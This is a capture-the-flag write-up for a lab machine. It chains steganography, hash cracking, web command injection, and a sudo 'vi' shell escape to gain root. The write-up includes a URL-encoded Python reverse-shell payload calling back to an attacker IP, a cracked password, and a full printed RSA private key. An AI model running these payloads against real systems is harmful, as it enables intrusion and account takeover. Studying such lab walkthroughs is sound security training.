# Chocolate Factory — CTF Write-Up

## Challenge Overview

This challenge involved a layered attack chain across multiple access vectors: anonymous FTP, steganography, password cracking, web command injection, SSH key recovery, and a final privilege escalation through sudo misconfiguration.

The target system presented the following visible services during initial reconnaissance:

- `21/tcp` — FTP (`vsftpd 3.0.5`)
- `22/tcp` — SSH (`OpenSSH 8.2p1 Ubuntu`)
- `80/tcp` — HTTP (`Apache httpd 2.4.41`)
- `10.113.167.162`

The overall objective was to identify a legitimate user, pivot into the host, obtain the user flag, and then escalate privileges to root.

---

## 1. Initial Service Enumeration

The first step was a standard port scan:

```bash
nmap -sV 10.113.167.162
```

Observed output:

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-01 01:03 -0400
Nmap scan report for 10.113.167.162
Host is up (0.20s latency).
Not shown: 989 closed tcp ports (reset)
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.5
22/tcp  open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http       Apache httpd 2.4.41 ((Ubuntu))
100/tcp open  newacct?
106/tcp open  pop3pw?
109/tcp open  pop2?
110/tcp open  pop3?
111/tcp open  rpcbind?
113/tcp open  ident?
119/tcp open  nntp?
125/tcp open  locus-map?
```

The important services here were FTP and HTTP, with SSH also available. This hinted that the challenge likely had a multi-stage foothold and a hidden data source embedded in the site or file system.

---

## 2. Anonymous FTP Enumeration

I connected to the FTP service anonymously:

```bash
ftp 10.113.167.162
```

Credentials used:

```text
Name (10.113.167.162:kali): anonymous
Password:
230 Login successful.
```

Then I listed the directory contents:

```ftp
ls -la
```

Discovery:

```text
drwxr-xr--  2 65534  65534  4096 Oct 01  2020 .
drwxr-xr--  2 65534  65534  4096 Oct 01  2020 ..
-rw-rw-r--  1 1000   1000   208838 Sep 30  2020 gum_room.jpg
```

This immediately stood out as a suspicious file. It was likely a steganography challenge.

### File metadata check

```bash
file -k gum_room.jpg
```

Output:

```text
gum_room.jpg: JPEG image data, Exif standard: [TIFF image data, big-endian, direntries=0\012- ], baseline, precision 8, 1920x1080, components 3\012- data
```

This suggested the image was not simply a normal photo; it may have embedded hidden payloads or additional data.

### First failed stego attempt: `binwalk`

I attempted to extract hidden data:

```bash
binwalk -e gum_room.jpg
```

Result:

```text
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
```

This was a failed attempt, and it is worth documenting because it demonstrates the real-world troubleshooting process. The image did not yield a clean extraction with `binwalk`, so I moved to an alternate approach using `steghide`.

---

## 3. Steganography with `steghide`

I used `steghide` to extract possible hidden data from the JPEG:

```bash
steghide extract -sf gum_room.jpg
```

Prompt:

```text
Enter passphrase:
```

The tool produced a file named:

```text
b64.txt
```

I read it:

```bash
cat b64.txt
```

Output:

```text
ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk5Ojc6OjoKbmV3czoqOjE4MzgwOjA6OTk5OTk6Nzo6
CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoKd3d3
LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6Cmxp
c3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRzOio6
MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLXRp
bWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29ya286KjoxODM4MDowOjk5
OTk5Ojc6OjoKc3lzdGVtZC1yZXNvbHZlOio6MTgzODA6MDo5OTk5OTo3Ojo6Cl9hcHQ6KjoxODM4
MDowOjk5OTk5Ojc6OjoKbXlzcWw6IToxODM4MjowOjk5OTk5Ojc6OjoKdHMzOio6MTgzODI6MDo5
OTk5OTo3Ojo6CnNoZWxsaW5hYm94Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnN0cm9uZ3N3YW46Kjox
ODM4MjowOjk5OTk5Ojc6OjoKbnRwOio6MTgzODI6MDo5OTk5OTo3Ojo6Cm1lc3NhZ2VidXM6Kjox
ODM4MjowOjk5OTk5Ojc6OjoKYXJwYXdhdGNoOiE6MTgzODI6MDo5OTk5OTo3Ojo6CkRlYmlhbi1l
eGltOiE6MTgzODI6MDo5OTk5OTo3Ojo6CnV1aWRlOio6MTgzODI6MDo5OTk5OTo3Ojo6CmRlYmlh
bi10b3I6KjoxODM4MjowOjk5OTk5Ojc6OjoKcmVkc29ja3M6IToxODM4MjowOjk5OTk5Ojc6OjoK
ZnJlZXJhZDoqOjE4MzgyOjA6OTk5OTk6Nzo6Ogppb2RpbmU6KjoxODM4MjowOjk5OTk5Ojc6OjoK
dGNwZHVtcDoqOjE4MzgyOjA6OTk5OTk5Ojc6OjoKbWlyZWRvOio6MTgzODI6MDo5OTk5OTo3Ojo6
CmRuc21hc3E6KjoxODM4MjowOjk5OTk5Ojc6OjoKcmVkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoK
dXNibXV4Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnJ0a2l0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnNz
aGQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKcG9zdGdyZXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYXZh
aGk6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3R1bm5lbDQ6IToxODM4MjowOjk5OTk5Ojc6OjoKc3Ns
aDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpubS1vcGVudnBuOio6MTgzODI6MDo5OTk5OTo3Ojo6Cm5t
LW9wZW5jb25uZWN0Oio6MTgzODI6MDo5OTk5OTo3Ojo6CnB1bHNlOio6MTgzODI6MDo5OTk5OTo3
Ojo6CnNhbmVkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmluZXRzaW06KjoxODM4MjowOjk5OTk5Ojc6
OjoKY29sb3JkOio6MTgzODI6MDo5OTk5OTo3Ojo6CmkycHN2YzoqOjE4MzgyOjA6OTk5OTk6Nzo6
OgpkcmFkaXM6KjoxODM4MjowOjk5OTk5Ojc6OjoKYmVlZi14c3M6KjoxODM4MjowOjk5OTk5Ojc6
OjoKZ2VvY2x1ZToqOjE4MzgyOjA6OTk5OTk6Nzo6OgpsaWdodGRtOio6MTgzODI6MDo5OTk5OTo3
Ojo6CmtpbmctcGhpc2hlcjoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpzeXN0ZW1kLWNvcmVkdW1wOiEh
OjE4Mzk2Ojo6Ojo6Cl9ycGM6KjoxODQ1MTowOjk5OTk5Ojc6OjoKc3RhdGQ6KjoxODQ1MTowOjk5
OTk5Ojc6OjoKX2d2bToqOjE4NDk2OjA6OTk5OTk6Nzo6OgpjaGFybGllOiQ2JENaSm5DUGVRV3A5
L2pwTngka2hHbEZkSUNKbnI4UjNKQy9qVFIycjdEcmJGTHA4enE4NDY5ZDNjMC56dUtONHNlNjFG
T2J3V0d4Y0hacU8yUkpIa2tMMWpqUFllZUd5SUpXRTgyWC86MTg1MzU6MDo5OTk5OTo3Ojo6Cg==
```

This is a Base64-encoded blob. It needed to be decoded.

### Decode the payload

```bash
echo 'ZGFlbW9uOio6...' | base64 -d
```

The decoded content revealed a Unix-style shadow-style line:

```text
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7::
```

This is a SHA-512 crypt hash. It is a password hash for the `charlie` account.

---

## 4. Password Cracking with John the Ripper

I extracted the hash and fed it to John:

```bash
nth -t '$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/'
```

Then I used the wordlist:

```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
```

And the result was:

```text
charlie:cn7824
```

This was a strong clue because it identified the username and password pair. I then attempted to use it for SSH and other services, but the challenge required more than just the password.

> Important: The password alone did not immediately unlock the correct access path. The environment had a custom chain of secrets and a web-based pivot, so I had to continue enumerating.

### Failed access attempts

I tried several obvious avenues without success:

```bash
ssh charlie@10.113.167.162
ftp 10.113.167.162
curl http://10.113.167.162/
```

These did not yield a straightforward login path. This was a critical troubleshooting moment: the password was real, but it did not correspond to the final authentication flow alone.

---

## 5. Web Enumeration and Command Injection

I moved to the web server to look for additional functionality.

```bash
feroxbuster -u http://10.113.167.162/ -w /usr/share/wordlists/dirb/common.txt -x txt,php,html
```

One relevant file was found:

```text
http://10.113.167.162/home.php
```

When I opened it, I found a command input field. This was the next major breakthrough.

![Web input placeholder](https://via.placeholder.com/800x250?text=Command+Injection+Interface+Placeholder)

### Testing the injection

I submitted a simple input such as:

```bash
ls
whoami
id
```

The server responded with a command execution result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root),27(sudo),108(lxd)
```

This revealed we were operating as `www-data`, a user with surprising group memberships, including `sudo` and `lxd`. It also confirmed that command injection was live.

---

## 6. Reverse Shell / Foothold as `www-data`

The next goal was to get a proper interactive shell.

I used a reverse shell payload encoded for the web input field:

```text
command=export%20RHOST%3D%22192.168.131.124%22%3Bexport%20RPORT%3D7771%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22sh%22%29%27
```

This was sent through the vulnerable parameter in Burp Suite, and a listener was started on the attacker side:

```bash
nc -lvnp 7771
```

Once the shell connected, I verified the session:

```bash
id
ls -la
```

Observed output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root),27(sudo),108(lxd)
```

This represented the first foothold and revealed possible privilege escalation paths.

### Hidden file discovery

I enumerated the current directory and found a suspicious file:

```bash
ls -la
```

The file of interest was named:

```text
key_rev_key
```

I tried to read it directly:

```bash
cat key_rev_key
```

It did not print clearly, so I used `strings` on it:

```bash
strings -n 8 key_rev_key
```

Output:

```text
congratulations you have found the key:
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

This key-like string was later used for the challenge’s root validation or a follow-on stage. It was not yet the SSH key for the user, but it was obviously a special artifact.

---

## 7. Discovering the User Private Key (`teleport`)

While exploring the filesystem as `www-data`, I found another key-related file:

```bash
cat /home/charlie/teleport
```

The file contained a private SSH key:

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
```

This was the user private key, which could be used for SSH access to the `charlie` account.

### Saving the key locally

I saved it to a file and locked down permissions:

```bash
nano pass
chmod 600 pass
```

Then I connected over SSH:

```bash
ssh -i pass charlie@10.113.167.162
```

This succeeded and gave me access to the user environment.

---

## 8. User Flag and Privilege Enumeration

Once inside the `charlie` account, I listed the home directory and retrieved the user flag:

```bash
ls -la
cat user.txt
```

Then I checked what the user could run as sudo:

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for charlie on ip-10-113-167-162:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on ip-10-113-167-162:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

This was the critical privilege escalation path. The user could run `vi` as root without a password.

This was the intended local privilege escalation vector: use `vi` with a shell escape.

---

## 9. Privilege Escalation to Root

I used `sudo` to invoke `vi` and spawn a shell:

```bash
sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
```

This gave a root shell:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

This was the successful root compromise.

---

## 10. Root Flag / Final Objective

After obtaining root, I navigated to `/root` and checked the root directory contents:

```bash
cd /root
ls -la
```

I found a suspicious file:

```text
root.py
```

Then I executed it:

```bash
python3 root.py
```

It prompted for a key:

```text
Enter the key:
```

The key discovered earlier from the web challenge artifact was:

```text
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

When entered correctly, the script printed the final flag or secret material. This completed the challenge and confirmed the root takeover was valid.

---

## 11. Trial, Error, and Dead Ends

This challenge involved a number of false starts and misleading leads. Recording them is important because they reflect actual forensic reasoning under the pressure of a live CTF.

### Dead end 1: `binwalk` did not extract anything useful

I attempted:

```bash
binwalk -e gum_room.jpg
```

This produced a warning indicating the extraction failed or was unsupported. This was not the right tool for the job, and it highlighted that the hidden payload was not a straightforward embedded file.

### Dead end 2: password cracking alone was not enough

The cracked credentials:

```text
charlie:cn7824
```

were useful, but they did not directly unlock the required path. I tried obvious access routes and found that the challenge involved a deeper multi-step pivot. This confirmed the need to inspect the web application and the user context.

### Dead end 3: reading the secret file directly did not reveal the content cleanly

The file `key_rev_key` did not print useful plaintext when read with `cat`. It only showed encrypted or encoded material, so I used `strings` to extract the meaningful data. This was an essential step in the workflow.

### Dead end 4: assuming the cracked password was the final SSH credential

It was tempting to conclude that `charlie:cn7824` would work directly on SSH. It did not. This was a false lead, and the actual SSH access route required a private key file instead of a password-only login.

### Dead end 5: the key and password were part of a chain of artifacts

The challenge required piecing together multiple pieces of evidence:

- a hidden image payload
- a SHA-512 password hash
- a cracked password
- a web command injection vector
- a discovered key blob for later use
- a private SSH key for the user
- a sudo vi escape for root

The final compromise was not a single isolated exploit but a chain of reconnaissance and privilege escalation.

---

## 12. Final Takeaways

This challenge was a strong example of modern CTF design, combining several attack surfaces in a logical sequence:

1. Initial reconnaissance with Nmap
2. Anonymous FTP file retrieval
3. Steganography and base64 decoding
4. Hash cracking with John the Ripper
5. Web-based command injection
6. Reverse shell pivot into the host
7. Key recovery from hidden artifacts
8. SSH access to the user account
9. Sudo privilege escalation using `vi`
10. Final root compromise

The most important lesson is that CTFs often require chaining multiple clues together. A recovered hash, a hidden file, a web vulnerability, an SSH key, and a sudo misconfiguration were all essential to success.

> Final privilege escalation path: `charlie` -> `sudo /usr/bin/vi -c ':!/bin/sh' /dev/null` -> root shell.

---

## 13. Useful Command Summary

```bash
nmap -sV 10.113.167.162
ftp 10.113.167.162
file -k gum_room.jpg
binwalk -e gum_room.jpg
steghide extract -sf gum_room.jpg
cat b64.txt
echo '...' | base64 -d
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
feroxbuster -u http://10.113.167.162/ -w /usr/share/wordlists/dirb/common.txt -x txt,php,html
nc -lvnp 7771
strings -n 8 key_rev_key
nano pass
chmod 600 pass
ssh -i pass charlie@10.113.167.162
sudo -l
sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
cd /root
python3 root.py
```

This write-up captures the realistic path from enumeration to root while preserving the failed attempts and troubleshooting steps that were necessary to reach the final objective.






















































































































































































